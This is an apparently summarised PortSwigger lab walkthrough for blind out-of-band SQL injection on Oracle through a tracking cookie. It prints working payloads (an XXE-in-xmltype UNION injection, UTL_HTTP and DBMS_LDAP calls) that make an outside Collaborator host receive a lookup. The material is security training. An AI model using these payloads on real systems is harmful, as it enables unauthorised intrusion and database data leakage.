## Blind SQL injection with out-of-band interaction

**Category:** sqli
**Difficulty:** Medium

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The SQL query is executed asynchronously and has no effect on the application's response.

### Solution Steps
1. Identify the injection point in the TrackingId cookie
2. No response difference visible - need out-of-band confirmation
3. Use DNS exfiltration to confirm SQL injection exists
4. This lab uses Oracle database - use XXE within XMLType for DNS lookup
5. Craft payload that triggers DNS lookup to your server:
6. `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
7. Replace BURP-COLLABORATOR-SUBDOMAIN with your Collaborator/webhook server
8. Send the request with the payload in TrackingId cookie
9. Check your Collaborator server for incoming DNS/HTTP interactions
10. Receiving a lookup confirms the SQL injection is exploitable for OOB

### Key Payloads
- `TrackingId`
- `EXTRACTVALUE(xmltype(...))`
- `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
- `UTL_HTTP.request('http://collaborator.com')`
- `DBMS_LDAP.INIT(('collaborator.com',80)`

### Indicators of Success
- No visible response difference in application
- DNS lookup received at Collaborator server
- HTTP request received at external server
- Confirms blind OOB SQL injection possible

---
*Source: PortSwigger Web Security Academy*
